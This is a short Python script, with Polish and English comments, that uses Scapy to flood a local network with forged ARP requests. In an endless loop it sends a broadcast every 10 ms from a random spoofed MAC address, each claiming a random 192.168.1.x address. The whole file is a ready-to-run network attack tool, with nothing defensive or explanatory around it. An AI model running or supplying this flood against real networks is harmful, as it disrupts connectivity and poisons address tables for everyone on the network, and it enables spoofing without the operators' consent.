from scapy.all import ARP, Ether, sendp, RandMAC
import random
import time

iface = "MediaTek Wi-Fi 6E MT7902 Wireless LAN Card"  # lub "eth0" w zależności od interfejsu

# infinite loop to send ARP packets
def flood_arp():
    try:
        while True:
            # random IP address in network, skip .1 (router) and .255 (adres rozgłoszeniowy)
            fake_ip = f"192.168.1.{random.randint(2, 254)}"
            # random MAC
            fake_mac = RandMAC()

            pkt = Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac) / ARP(
                op=1,               # "who has" (request)
                psrc=fake_ip,       # pretending that we have this fake IP
                pdst=fake_ip,       # asking who has the same address as psrc
                hwsrc=fake_mac
            )

            sendp(pkt, iface=iface, verbose=False)
            print(f"Sent fake ARP: {fake_ip} is-at {fake_mac}")
            time.sleep(0.01)  # make it a little slower

    except KeyboardInterrupt:
        print("\n[!] Przerwano floodowanie.")

flood_arp()
